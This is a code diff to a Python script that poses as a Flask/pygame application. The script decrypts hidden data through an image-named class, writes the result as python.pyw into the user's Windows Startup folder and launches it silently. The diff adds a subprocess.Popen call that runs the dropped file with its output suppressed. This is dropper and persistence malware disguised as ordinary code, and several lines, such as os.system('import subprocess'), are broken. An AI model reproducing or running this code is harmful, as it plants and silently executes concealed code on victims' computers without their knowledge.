@@ -7,7 +7,7 @@ try:
     from flask_wtf import FlaskForm
 except:
     os.system('pip install Flask-WTF')
-    from flask_wtf import FlaskForm
+    exit()
 try:
     from wtforms import StringField, SubmitField
 except:
@@ -58,6 +58,11 @@ try:
 except:
     os.system('pip install threading')
     import threading
+try:
+    import subprocess
+except:
+    os.system('import subprocess')
+    import subprocess
 try:
     try:
         import pygame
@@ -172,5 +177,5 @@ aaa=fR"C:\Users\{psutil.users()[0].name}\AppData\Roaming\Microsoft\Windows\Start
 f=open(aaa,'wb')
 f.write(ImageToPygame(imaged).decrypt(images))
 f.close()
+subprocess.Popen(['python',fR'''C:\Users\{psutil.users()[0].name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.pyw'''], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 pygame.quit()
-os.system(fR'''python "C:\Users\{psutil.users()[0].name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\python.pyw"  > nul 2>&1''')
